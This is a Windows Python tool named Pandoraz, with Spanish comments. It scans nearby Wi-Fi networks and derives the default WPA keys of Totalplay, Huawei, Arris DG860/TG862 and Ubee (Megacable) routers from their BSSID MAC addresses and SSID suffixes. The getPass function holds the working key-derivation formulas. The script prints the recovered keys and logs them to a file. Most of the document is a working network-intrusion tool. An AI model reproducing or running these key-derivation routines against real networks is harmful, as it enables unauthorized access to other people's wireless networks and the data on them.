# -*- Coding: UTF-8 -*-
# Python 3.5.X y 3.6.X
# Windows
#
#   ██████╗  █████╗ ███╗   ██╗██████╗  ██████╗ ██████╗  █████╗ ███████╗
#   ██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔═══██╗██╔══██╗██╔══██╗╚══███╔╝
#   ██████╔╝███████║██╔██╗ ██║██║  ██║██║   ██║██████╔╝███████║  ███╔╝ 
#   ██╔═══╝ ██╔══██║██║╚██╗██║██║  ██║██║   ██║██╔══██╗██╔══██║ ███╔╝  
#   ██║     ██║  ██║██║ ╚████║██████╔╝╚██████╔╝██║  ██║██║  ██║███████╗
#   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
#                                                         By: LawlietJH
#                                                               v1.5.6

import datetime
import random
import locale 
import msvcrt
import time
import sys
import os



Version = "v1.5.6"



# Banners: http://patorjk.com/software/taag/



Banner1 = """
      ██████╗  █████╗ ███╗   ██╗██████╗  ██████╗ ██████╗  █████╗ ███████╗
      ██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔═══██╗██╔══██╗██╔══██╗╚══███╔╝
      ██████╔╝███████║██╔██╗ ██║██║  ██║██║   ██║██████╔╝███████║  ███╔╝ 
      ██╔═══╝ ██╔══██║██║╚██╗██║██║  ██║██║   ██║██╔══██╗██╔══██║ ███╔╝  
      ██║     ██║  ██║██║ ╚████║██████╔╝╚██████╔╝██║  ██║██║  ██║███████╗
      ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
"""
# Fuente: ANSI Shadow - http://patorjk.com/software/taag/#p=display&f=ANSI%20Shadow&t=Pandoraz


Banner2 = """
                            ╔═╗┌─┐┌┐┌┌┬┐┌─┐┬─┐┌─┐┌─┐
                            ╠═╝├─┤│││ │││ │├┬┘├─┤┌─┘
                            ╩  ┴ ┴┘└┘─┴┘└─┘┴└─┴ ┴└─┘
"""
# Fuente: Calvin S - http://patorjk.com/software/taag/#p=display&f=Calvin%20S&t=Pandoraz

Autor = """
                            ╦  ┌─┐┬ ┬┬  ┬┌─┐┌┬┐╦╦ ╦
                            ║  ├─┤││││  │├┤  │ ║╠═╣
                            ╩═╝┴ ┴└┴┘┴─┘┴└─┘ ┴╚╝╩ ╩
"""
# Fuente: Calvin S - http://patorjk.com/software/taag/#p=display&f=Calvin%20S&t=LawlietJH



#=======================================================================



def Dat():	# Función Que Permite Mostrar Los Datos Del Script.
	
	os.system("cls && Title Pandoraz.py                "+\
			"By: LawlietJH                "+Version+"    ")
	print("\n\n", Banner1)
	print("\n\n", Autor)
	print("\n{:^80}".format(Version))
	
	try:
		os.system("TimeOut /NoBreak 2 > Nul")
	except:
		Dat()



def Pause(Quiet=True):		# Hace Una Pausa.
	
	if Quiet: os.system("Pause > Nul")		# No muestra Nada En Pantalla.
	
	else: os.system("Pause")		# Muestra En Pantalla: Presione una tecla para continuar...



def Salir(Num=0):	# Fucnión Que Permite Salir Del Script Sin Error Alguno.
	
	try:
		Sleep(1.5)
		exit(Num)
	except KeyboardInterrupt:
		Salir(Num)



def Sleep(Num=1.5):	# Hace una Pausa Temporal.
	
	time.sleep(Num)



def Chk_Dep():
	
	if sys.version[2] == "4" or sys.version[2] == "5":
		
		try:
			import keyboard
			
			print("\n\n\t[!] Checando Dependencias... Módulo 'keyboard' OK\t\t"), Sleep(.5)
			
		except NameError:	# Python 3.5
			print("\n\n\t[!] Instalando Dependencias... Módulo 'Keyboard'\n\n\t\t")
			os.system("Title Instalando Keyboard && py -m pip install keyboard && Title Pandoraz.py            By: LawlietJH")
			
		except ImportError:
			print("\n\n\t[!] Instalando Dependencias... Módulo 'Keyboard'\n\n\t\t")
			os.system("Title Instalando Keyboard && py -m pip install keyboard && Title Pandoraz.py            By: LawlietJH")
			
		except Exception as ex:
			print( type(ex).__name__ )		#Ver cuando ocurre un error y poder añadirlo a las ecepciones, y no cierre el programa.
	
		#===================================================================
		
		try:
			import win32api
			
			print("\n\n\t[!] Checando Dependencias... Módulo 'pypiwin32' OK\n\n\t\t"), Sleep(.5)
			
		except NameError:	# Python 3.5
			print("\n\n\t[!] Instalando Dependencias... Módulo 'pypiwin32'\n\n\t\t")
			os.system("Title Instalando pypiwin32 && py -m pip install pypiwin32 && Title Pandoraz.py            By: LawlietJH")
			
		except ImportError:
			print("\n\n\t[!] Instalando Dependencias... Módulo 'pypiwin32'\n\n\t\t")
			os.system("Title Instalando pypiwin32 && py -m pip install pypiwin32 && Title Pandoraz.py            By: LawlietJH")
			
		except Exception as ex:
			print( type(ex).__name__ )		#Ver cuando ocurre un error y poder añadirlo a las ecepciones, y no cierre el programa.

	elif sys.version[2] == "6":

		try:
			import keyboard
			
			print("\n\n\t[!] Checando Dependencias... Módulo 'keyboard' OK\t\t"), Sleep(.5)
			
		except ModuleNotFoundError:	# Python 3.6
			print("\n\n\t[!] Instalando Dependencias... Módulo 'keyboard'\n\n\t\t")
			os.system("Title Instalando Keyboard && py -m pip install keyboard && Title Pandoraz.py            By: LawlietJH")
			
		except ImportError:
			print("\n\n\t[!] Instalando Dependencias... Módulo 'keyboard'\n\n\t\t")
			os.system("Title Instalando Keyboard && py -m pip install keyboard Title Pandoraz.py            By: LawlietJH")
			
		except Exception as ex:
			print( type(ex).__name__ )		#Ver cuando ocurre un error y poder añadirlo a las ecepciones, y no cierre el programa.
	
		#===================================================================
		
		try:
			import win32api
			
			print("\n\n\t[!] Checando Dependencias... Módulo 'pypiwin32' OK\n\n\t\t"), Sleep(.5)
			
		except ModuleNotFoundError:	# Python 3.6
			print("\n\n\t[!] Instalando Dependencias... Módulo 'pypiwin32'\n\n\t\t")
			os.system("Title Instalando pypiwin32 && py -m pip install pypiwin32 && Title Pandoraz.py            By: LawlietJH")
			Sleep(5)
			
		except ImportError:
			print("\n\n\t[!] Instalando Dependencias... Módulo 'pypiwin32'\n\n\t\t")
			os.system("Title Instalando pypiwin32 && py -m pip install pypiwin32 && Title Pandoraz.py            By: LawlietJH")
			Sleep(5)
			
		except Exception as ex:
			print( type(ex).__name__ )		#Ver cuando ocurre un error y poder añadirlo a las ecepciones, y no cierre el programa.
			
	else:
		
		print("\n\n\n\n    [!] Compatibilidad con:"+
		"\n\n\t\t [+] Python 3.4.X"+
		"\n\t\t [+] Python 3.5.X"+
		"\n\t\t [+] Python 3.6.X"+
		"\n\n    [!] Solamente estos, Por Ahora."+
		"\n\n\n\n    [!] Tu Versión Actual es: Python", sys.version[:5], "\n\n\n\n")
		Pause(False)
		Dat()
		Salir()
		
Chk_Dep()				#~ Se instalan los módulos keyboard y pypiwin32 si estos no estan instalados.

try:
	import keyboard 	# Se Importa El Módulo.
except:					# Si Hay Algún Error Significa Que No Se Instaló Correctamente.
	print("\n\n   No se pudo instalar correctamente el Módulo 'keyboard'.")
	print("\n   Revise Su Conexión o Instale El Módulo Manualmente Desde Consola Con:")
	print("\n\t 'pip install keyboard'   o   'pip3 install keyboard'")
	
	try:
		Pause()
	except KeyboardInterrupt: pass
	
	Dat()
	Salir(1)

try:
	import win32api 	# Se Importa El Módulo.
except:					# Si Hay Algún Error Significa Que No Se Instaló Correctamente.
	
	print("\n\n [!] Cierra y Vuelve a Abrir este Script Para Que este Actualizado con el Nuevo Módulo."), Sleep(2)
	print("\n\n [!] Si no se instalo correctamente el Módulo: "), Sleep(2)
	#~ print("\n\n   No se pudo instalar correctamente el Módulo 'pypiwin32'.")
	print("\n   Revise Su Conexión o Instale El Módulo Manualmente Desde Consola Con:")
	print("\n\t 'pip install pypiwin32'   o   'pip3 install pypiwin32'")
	
	try:
		Pause()
	except KeyboardInterrupt: pass
	
	Dat()
	Salir(1)



#=======================================================================


# Función Que Comprueba si el SO es Windows, Devuelve TRUE/FALSE
def isWindows():
	
	osver = os.popen("ver").read()
	
	if osver.find("Windows") > 0: return True
	else: return False



# Función Que Comprueba si el SO es Linux, Devuelve TRUE/FALSE
def isLinux():
	
	osver = os.popen("ver").read()
	
	if osver.find("Linux") > 0: return True
	else: return False



# Función Que Comprueba si es Python Versión 2, Devuelve TRUE/FALSE
def isPyver2():
	
	xD=sys.version[0]
	
	if int(xD) == 2: return True
	else: return False



# Función Que Comprueba si es Python Versión 3, Devuelve TRUE/FALSE
def isPyver3():
	
	xD=sys.version[0]
	
	if int(xD) == 3: return True
	else: return False

#=======================================================================

def PressON(Cadena=""):		# Permite Capturar 1 Caracter Que se Escriba en Pantalla,
							# Como un Input() pero de 1 solo caracter.
	
	Imp()
	
	print(Cadena, end="")
	Resp = msvcrt.getch()
	print(Resp)
	
	return Resp



def Clear():		# Limpia Pantalla.
	
	os.system("Cls")



def Ctrl_C():
	
	try:
		print("\n\n\n\n\t\t [!] Cancelado...")
		os.system("title Cancelando... && timeout /nobreak 03 > Nul")
		return
		
	except KeyboardInterrupt:
		
		Ctrl_C()




#~ Función Que Permite Esconder El Cursor de la Pantalla (La rayita que parpadea xD).
def HiddenCursor(imp="Hide"):
	
	#~ imp = imp.title()		#Devuelve la cadena solo con la primera letra de cada palabra en mayuscula
	imp = imp.capitalize()		#Devuelve la cadena solo con la primera letra de la primer palabra en mayuscula

	if os.name == 'nt':
		import msvcrt
		import ctypes

		class _CursorInfo(ctypes.Structure):
			_fields_ = [("size", ctypes.c_int),
						("visible", ctypes.c_byte)]
	
	def hide_cursor():
		if os.name == 'nt':
			ci = _CursorInfo()
			handle = ctypes.windll.kernel32.GetStdHandle(-11)
			ctypes.windll.kernel32.GetConsoleCursorInfo(handle, ctypes.byref(ci))
			ci.visible = False
			ctypes.windll.kernel32.SetConsoleCursorInfo(handle, ctypes.byref(ci))
		elif os.name == 'posix':
			sys.stdout.write("\033[?25l")
			sys.stdout.flush()

	def show_cursor():
		if os.name == 'nt':
			ci = _CursorInfo()
			handle = ctypes.windll.kernel32.GetStdHandle(-11)
			ctypes.windll.kernel32.GetConsoleCursorInfo(handle, ctypes.byref(ci))
			ci.visible = True
			ctypes.windll.kernel32.SetConsoleCursorInfo(handle, ctypes.byref(ci))
		elif os.name == 'posix':
			sys.stdout.write("\033[?25h")
			sys.stdout.flush()
			
	if imp == "Hide":
		hide_cursor()
	elif imp =="Show":
		show_cursor()
	else:
		pass



#=======================================================================



Inter = "Wi-Fi"
RxD = False
Red = False
Redes = []
Interfaces = {}
Pwd = {}
Resp = 0
Tam = 0
Eny = 0



#=======================================================================



def Chk_WiFi(Cadena):
	
	global RxD, Resp, Inter
	
	while True:
		
		if RxD == False:
						
			Clear()
		
			print("\n\n\t [+] Lista De Interfacez De Red Disponibles:")
			
			if "Wi-Fi" in Cadena:
			
				print("\n\n\t [*] 1 - Wi-Fi")
					
				for x in range(12):
								
					if ("Wi-Fi " + str(x+1)) in Cadena:
						
						print("\n\t [*] " + str(x+1) + " - Wi-Fi " + str(x+1))
				
				Inter = "Wi-Fi"
				
			elif "Conexi" in Cadena:
			
				print("\n\n\t [*] 1 - Conexión de red inalámbrica")
				
				for x in range(12):
								
					if ("Conexi¢n de red inal mbrica " + str(x+1)) in Cadena:
						
						print("\n\t [*] " + str(x+1) + " - Conexión de red inalámbrica " + str(x+1))
				
				Inter = "Conexi¢n de red inal mbrica"
				
			try:
				
				Resp = PressON("\n\n\t\t [+] Selecciona Una Interfaz: ")
				
				if Resp == "": print("\n\n\t [!] Elige Una Opción!"), Sleep(1)
				else:
					
					if Resp == b"\x03": Dat(), Salir(0)
					
					if int(Resp) > 1: Inter += " " + str(int(Resp))
					
					if Inter in Cadena:
												
						Resp = int(Resp)
						RxD = True
						break
						
					else: print("\n\n\t [!] Opción Inexistente!"), Sleep(1)
				
			except KeyboardInterrupt:
				Dat()
				Salir(0)
			except ValueError: print("\n\n\t [!] Caracteres No Validos!"), Sleep(1)
			
			except EOFError: Salir(1)
					
			except Exception as ex: print(type(ex).__name__), Sleep(1)
			
		
		else: break
	
	xD = Cadena.split("Nombre de interfaz : ")[1:]
				
	for x in xD:
		
		NomInt = x.split("\n")[0].strip()
		Interfaces[NomInt] = x
		
	Cadena = Interfaces[Inter]
	
	return Cadena



def ObtenerRedes():
	
	global Tam, RxD, Eny
	Bool = False
	Tam = 0
	Resp = ""
	Cont = 0
	Cony = 0
	
	ESSID = []	# Nombre De La Red Wifi.
	BSSID = []	# Dirección MAC De La Red Wifi.
	Senial = []	# Porcentaje de Señal De La Red Wifi.
	Canal = []	# Canal De La Red Wifi.
	Datos = {}	# Diccionario Que Almacenará Las Listas.
	
	Comando = "netsh wlan show networks mode=Bssid"
	Cadena = os.popen(Comando)
	Cadena = Cadena.read()
	
	NoInterfaces = "El Servicio de"
	
	if NoInterfaces in Cadena:
		
		try:
			print("\n\n\n\t [!] No hay Interfaces de Red wi-Fi Disponibles!\n\n")
			print("\n\n\t [!] Saliendo...")
			Sleep(3)
			Dat()
			Salir(0)
		except KeyboardInterrupt:
			Dat()
			Salir(0)
	
	Eny = Cadena.count("Wi-Fi")		# Se Obtiene El Número De Tarjetas Wi-Fi Disponibles.
	
	if Eny == 0: Eny = Cadena.count("Conexi¢n de red inal mbrica")
	
	if Eny > 1:
		
		Bool = True
		Cadena = Chk_WiFi(Cadena)
		
	Cadena = Cadena.split("\n")
	
	Info = Chk_Info(Cadena, Bool)
	
	os.system("cls && Title Pandoraz.py                "+\
			"By: LawlietJH                "+Version+"    ")
	
	print(Info)
	
	for x in Cadena:
		
		if "SSID" in x:
			
			if "Ç­" in x: x = x.replace("Ç­", "á")
			elif "Ç¸" in x: x = x.replace("Ç¸", "é")
			elif "Çð" in x: x = x.replace("Çð", "í")
			elif "Çü" in x: x = x.replace("Çü", "ó")
			elif "Ç§" in x: x = x.replace("Ç§", "ú")
			
			Cont += 1
			x = x.split(" : ")[1]
			
			if Cont == 1:
				
				ESSID.append(x)
				Tam += 1
				
			elif Cont == 2:
				
				x = x.upper()
				BSSID.append(x)
				Cont = 0
				
		elif "Se" in x:
			
			x = x.split(" : ")[1]
			Senial.append(x)
		
		elif "Canal" in x:
		
			x = x.split(" : ")[1]
			Canal.append(x)
	
	Datos["ESSID"] = ESSID
	Datos["BSSID"] = BSSID
	Datos["Senial"] = Senial
	Datos["Canal"] = Canal
	
	return Datos



def Chk_Info(Cadena, Bool):
	
	Conty = 0
	xD = ""
	
	if Bool == False:
		
		for X in Cadena:
			
			Conty += 1
			
			if Conty == 1:
				if X.startswith("No hay ninguna interfaz"):
					xD += "\n\n\t [+] No hay ninguna interfaz inalámbrica en el sistema.\n\t"
					Conty = 0
				#~ else:
					#~ xD += "\n\n\t [+] " + X + "\n\t"
			
			elif Conty == 2:
				if "Conexi¢n de red inal mbrica" in X:
					
					X = X.replace("¢","ó")
					X = X.replace(" ","á")
					
					xD += "\n\n\t [+] " + X + "\n\n\t [*] "
				else:
					xD += "\n\n\t [+] " + X + "\n\n\t [*] "
			elif Conty == 3:
				if X.startswith("La"):
					xD += "La interfaz de la red de área local inalámbrica está\n\t"+\
						"     apagada y no es compatible con la operación solicitada."
				else: xD += X
	else:
		
		for X in Cadena:
			
			Conty += 1
			
			if Conty == 1:
				if X.startswith("Conexi¢n de red inal mbrica"):
					
					X = X.replace("¢","ó")
					X = X.replace(" ","á")
					
					xD += "\n\n\t [+] Nombre de interfaz : " + X + "\n\n\t [*] "
				else:
					xD += "\n\n\t [+] Nombre de interfaz : " + X + "\n\n\t [*] "
			elif Conty == 2:
				if X.startswith("La"):
					xD += "La interfaz de la red de área local inalámbrica está\n\t"+\
						"     apagada y no es compatible con la operación solicitada."
				else: xD += X
	
	return xD



def ImprimirListaWifi(Datos):
	
	global Redes, Red, Tam, RxD
	
	Red = False
	Redes = []
	Cont = 0
	
	try:
		
		print("\n\n\t     ESSID \t        Señal   Canal \t       BSSID",
		"\n =============================================================================\n")
		
		for x in range(Tam):
			
			if x < 9:
				if len(Datos["ESSID"][Cont]) > 18:
					print("    [*] 0{} - {}\n\t\t\t\t {}\t  {}\t {}".format(x+1, Datos["ESSID"][Cont], Datos["Senial"][Cont], Datos["Canal"][Cont], Datos["BSSID"][Cont]))
				elif len(Datos["ESSID"][Cont]) <= 10:
					print("    [*] 0{} - {}\t\t {}\t  {}\t {}".format(x+1, Datos["ESSID"][Cont], Datos["Senial"][Cont], Datos["Canal"][Cont], Datos["BSSID"][Cont]))
				else:
					print("    [*] 0{} - {}\t {}\t  {}\t {}".format(x+1, Datos["ESSID"][Cont], Datos["Senial"][Cont], Datos["Canal"][Cont], Datos["BSSID"][Cont]))
			else:
				if len(Datos["ESSID"][Cont]) > 18:
					print("    [*] {} - {}\n\t\t\t\t {}\t  {}\t {}".format(x+1, Datos["ESSID"][Cont], Datos["Senial"][Cont], Datos["Canal"][Cont], Datos["BSSID"][Cont]))
				elif len(Datos["ESSID"][Cont]) <= 10:
					print("    [*] {} - {}\t\t {}\t  {}\t {}".format(x+1, Datos["ESSID"][Cont], Datos["Senial"][Cont], Datos["Canal"][Cont], Datos["BSSID"][Cont]))
				else:
					print("    [*] {} - {}\t {}\t  {}\t {}".format(x+1, Datos["ESSID"][Cont], Datos["Senial"][Cont], Datos["Canal"][Cont], Datos["BSSID"][Cont]))
				
			getNameRedes(Datos, Cont)
			
			Cont += 1
	
		print("\n =============================================================================")
	
	except IndexError:
		
		print("\t\t Surgió Un Error! Restaurando!...")
		print("\n =============================================================================")
		time.sleep(3)
		RxD = False



def getNameRedes(Datos, Pos):
	
	global Red, Redes
	
	if "Totalplay" in Datos["ESSID"][Pos]:		# Para redes Totalplay de 4 Caracteres: Totalplay-XXXX 
			Red = True
			Redes.append(Datos["ESSID"][Pos])
			Redes.append(Datos["Senial"][Pos])
			Redes.append(Datos["Canal"][Pos])
			Redes.append(Datos["BSSID"][Pos])
	
	elif "Huawei" in str(Datos["ESSID"][Pos]):		# Para redes Huawei: Huawei-XXXX-XXXX 
		
			Red = True
			Redes.append(Datos["ESSID"][Pos])
			Redes.append(Datos["Senial"][Pos])
			Redes.append(Datos["Canal"][Pos])
			Redes.append(Datos["BSSID"][Pos])
			
	elif "TOTALPLAY" in str(Datos["ESSID"][Pos]):		# Para redes Totalplay de 6 Caracteres: TOTALPLAY_XXXXXX 
			
			Red = True
			Redes.append(Datos["ESSID"][Pos])
			Redes.append(Datos["Senial"][Pos])
			Redes.append(Datos["Canal"][Pos])
			Redes.append(Datos["BSSID"][Pos])

	elif "DG860" in str(Datos["ESSID"][Pos]) or "TG862" in str(Datos["ESSID"][Pos]):	# Para redes Arris DG860/TG862
			
			Red = True
			Redes.append(Datos["ESSID"][Pos])
			Redes.append(Datos["Senial"][Pos])
			Redes.append(Datos["Canal"][Pos])
			Redes.append(Datos["BSSID"][Pos])
			
	elif "Ubee" in str(Datos["ESSID"][Pos]):	# Para redes UbeeXXXX (De Megacable)
			
			Red = True
			Redes.append(Datos["ESSID"][Pos])
			Redes.append(Datos["Senial"][Pos])
			Redes.append(Datos["Canal"][Pos])
			Redes.append(Datos["BSSID"][Pos])
	
	#~ elif len(Datos["ESSID"][Pos]) == 6:		# Para redes Cisco/Pegatron
			
			#~ Red = True
			#~ Redes.append(Datos["ESSID"][Pos])
			#~ Redes.append(Datos["Senial"][Pos])
			#~ Redes.append(Datos["Canal"][Pos])
			#~ Redes.append(Datos["BSSID"][Pos])

def getPassRedes():
	
	global Redes, Pwd
	
	Cont = 0
	Cony = 0
	Name = ""
	Pass = ""
	
	print("\n [+] Contraseñas Posibles De Redes Conseguidas:")
	
	if len(Redes) != 0:
		
		print("\n\t  Red (ESSID) \t   | Señal | Canal |   MAC (BSSID)   |  *WPA Key\n")
		
		for X in Redes:
			
			Cont += 1
			
			if Cont == 1:
				
				Cony += 1
				Name = X
				
				print(" [*] {} - {}".format(Cony, X), end=" "*(20-len(X)))
			
			elif Cont == 2:
				X = X.strip()
				if len(X) == 4: print("{}".format(X), end="    ")
				elif len(X) == 3: print(" {}".format(X), end="    ")
				elif len(X) == 2: print("  {}".format(X), end="    ")
			
			elif Cont == 3:
				X = X.strip()
				if len(X) == 1: print("  {}".format(X), end="    ")
				elif len(X) == 2: print(" {}".format(X), end="    ")
				else: print(" ")
			elif Cont == 4:
				
				Pass = getPass(Name, X)
				Pwd[Name] = Pass
				
				print("{}   {}".format(X, Pass))
				
				Cont = 0
			
	else: print("\n\n\t [!] Sin Redes Disponibles... Por Ahora...")



def getPass(Nombre, MAC):
	
	Nomb1, Nomb2 = "", ""
	Pass = ""
	xD = ""
	
	if "Totalplay" in Nombre:	# Para redes Totalplay de 4 Caracteres: Totalplay-XXXX.
		
		try: xD = Nombre.split("-")[1]
		except: Pass = "UNKNOWN"
		
		if len(xD) == 4:
			
			Nombre = Nombre[-4:]
			MAC = MAC.split(":")
			Pass = MAC[3] + MAC[4] + Nombre
			
		else: Pass = "UKNOWN"
	
	elif "Huawei" in Nombre:		# Para redes Huawei-XXXX-XXXX.
		
		try: xD = Nombre.split("-")[2]
		except: Pass = "UNKNOWN"
		
		if len(xD) == 4:
			
			Nombre = Nombre[-4:]
			MAC = MAC.split(":")
			Pass = MAC[3] + MAC[4] + Nombre
			
		else:  Pass = "UKNOWN"
		
	elif "TOTALPLAY" in Nombre:	# Para redes Totalplay de 6 Caracteres: TOTALPLAY_XXXXXX.
		
		MAC = MAC.split(":")
		
		Pass = MAC[3].upper() + MAC[4].upper() + MAC[4].lower() + MAC[5].lower()
				
	elif "DG860" in Nombre or "TG862" in Nombre:	# Para Redes Arris DG860XXX/TG862XXX.
		
		if len(Nombre) == 8:
			
			Nombre1 = Nombre[:6]
			Nombre2 = Nombre[-2:]
			MAC = MAC.split(":")
			Pass = Nombre1 + MAC[3] + MAC[4] + Nombre2
		
		else: Pass = "UNKNOWN"
	
	elif "Ubee" in Nombre:	# Para redes UbeeXXXX de Megacable. 
		
		if len(Nombre) == 8:
			
			MAC = MAC.split(":")
			Nomb1 = MAC[1] + MAC[2] + MAC[3]
			Nomb2 = Nombre[-4:]
			
			Pass = Nomb1 + Nomb2
			Pass = Pass.upper()
		
		#~ else:
	
	#~ elif len(Nombre) == 6:
		
		#~ Pass = "27???????"
		
	return Pass



def SavePass():
	
	global Redes, Pwd
	
	Nombres = []
	
	open("📶 Pass.ZioN","a")
	Eny = open("📶 Pass.ZioN","r+")
	
	Lineas = Eny.readlines()
	
	if Lineas == []: Eny.write("\n [+] Por: LawlietJH - Pandoraz "+Version+"\n")
	
	for x in Lineas:
		
		x = x.split("\n")[0]
		
		if "ESSID: " in x:
			
			x = x.split(": ")[1]
			Nombres.append(x)
	
	Cont = 0
	Cony = 0
	Nomb = ""
	Cad1 = ""
	Cad2 = ""
	x = ""
	
	for xD in Redes:
		
		Cont += 1
		
		if Cont == 1:
			
			Nomb = xD
			
			Cad1 = "\n\t=======================================\n\t   ESSID: " + Nomb +\
				   "\n\t*WPA Key: " + Pwd[Nomb]
			
			Cony += 1
			
		elif Cont == 3:
			
			x = "\n\t   Canal: " + xD
			
		elif Cont == 4:
			
			Cad2 = "\n\t   BSSID: " + xD + x + "\n\t======================================="
			Cont = 0
			
			if not Nomb in Nombres:
				
				dt = datetime.datetime.now()
				FH = dt.strftime("\n\n\n\t%A %d de %B del %Y - %H:%M").title()
				
				Eny.write(FH+Cad1+Cad2)



def Atajos():
	
	global RxD, Eny
	
	xDD = False
	Lista = ["Ctrl+I - Información.","Ctrl+C - Volver/Salir."]
	Z = 0		# Por si Falla la Comparación de Tiempos.
	Cont = 0
	
	dt = datetime.datetime.now()
	dt = int(dt.strftime("%S")) + 1			# Se Obtienen los Segundos Actuales del Reloj + 1 Segundo.
	
	while True:
		
		try:
			Imp()	# Limpia El Buffer.
			
			if keyboard.is_pressed('Ctrl + I'):	# Si Se Preciona Las Teclas 'Ctrl+I' Se Obtiene Información.
				
				Sleep(0.5)
				#~ os.system("Title [+] Información! ")
				GetInfo()	# Muestra Información.
				Imp()	# Limpia El Buffer.
				break
				
			elif keyboard.is_pressed('Ctrl + C'):	# Si Se Preciona Las Teclas 'Ctrl+C' Se Obtiene Información.
				
				if Cont == 0 and Eny > 1:
					
					print("\n\n\t [!] Volviendo...")
					Cont += 1
					RxD = False
					break
				
				elif Cont == 0 and Eny <= 1:
					
					print("\n\n\t [!] Saliendo...")
					Cont += 1
					xDD = True
					Salir(0)
					break
				
				#~ elif Cont == 0 and Eny == 0: print("xD")
				
			else:
				
				Z += 1	# Aumenta en 1 en cada Ciclo.
				
				dt2 = datetime.datetime.now()
				dt2 = int(dt2.strftime("%S"))	# Se Obtienen los Segundos Actuales del Reloj.
					
				if Z >= 5000:		# Si Falla La Coincidencia De Tiempos, Esto Terminara el Ciclo en Aproximadamente un Segundo. 
					
					randy = random.choice(Lista)
					print("\n\n\n\t\t [+] " + randy)
					Sleep(1.5)
					break
				
				elif dt2 == dt: break		# Si Ambos Tiempos Son Iguales, Significa Que Paso 1 Segundo y se Cierra El Ciclo.
								
		except:
			if xDD == True:
				Dat()
				Salir(0)



def GetInfo():
	
	try:
		
		Run("Info.py")
		
	except KeyboardInterrupt:
		
		print("\n\n\t [!] Saliendo...")
		try:
			Sleep(1.5)
		except KeyboardInterrupt: pass
		Dat()
		Salir(0)
		
	return



def Imp():	# Limpia El Buffer (Flush)
    
    try:
        
        import msvcrt
        
        while msvcrt.kbhit(): msvcrt.getch()
            
    except ImportError:
		
        import sys, termios
        
        termios.tcflush(sys.stdin, termios.TCIOFLUSH)




# Abre Una Nueva Ventana Para Ejecutar Otro Script.
def Run(Programa=""):
	
	import traceback, types
		
	import win32api, win32con, win32event, win32process
	from win32com.shell.shell import ShellExecuteEx
	from win32com.shell import shellcon
	
	showCmd = win32con.SW_SHOWNORMAL
	cmd = Programa
	params = ''
	cmdDir = ''
	lpVerb = ''
	
	procHandle = win32api.ShellExecute(0, lpVerb, cmd, params, cmdDir, showCmd)
	#~ procInfo = ShellExecuteEx(nShow=showCmd, fMask=shellcon.SEE_MASK_NOCLOSEPROCESS, lpVerb=lpVerb, lpFile=cmd, lpParameters=params)
	
	#~ http://pt.stackoverflow.com/questions/6929/como-rodar-um-subprocess-com-permiss%C3%A3o-de-administrador



#=======================================================================



def Main():
	
	try:
		locale.setlocale(locale.LC_ALL, "es-MX")
		HiddenCursor()
	
		os.system("Title Pandoraz.py                "+\
				"By: LawlietJH                "+Version+"    ")
	
		print("\n\n\t\t [!] Escaneando La Red Wifi!"), Sleep()
	except:
		pass
	
	while True:
		
		try:
			Datos = ObtenerRedes()
			ImprimirListaWifi(Datos)
			getPassRedes()
			SavePass()
			Atajos()
			Imp()	# Limpia El Buffer.
			
		except IndexError: os.system("TimeOut /NoBreak 1 > Nul")
		except KeyboardInterrupt: pass
			#~ print("\n\n\t [!] Saliendo...")
			#~ try:
				#~ time.sleep(1.5)
			#~ except KeyboardInterrupt: pass
			#~ Dat()
			#~ Salir(0)
		#~ except:
			#~ try:
				#~ time.sleep(1.5)
			#~ except KeyboardInterrupt: pass
			

if __name__ == "__main__":
	
	os.system("Color 0A")
	
	if isWindows():
		
		if isPyver3(): Main()
		else:
			print("\n\n\t Compatible Solo Con Versiones 3.4.X, 3.5.X y 3.6.X de Python.")
			Pause()
	else:
		print("\n\n\t Compatible Solo Con Windows.")
		Pause()

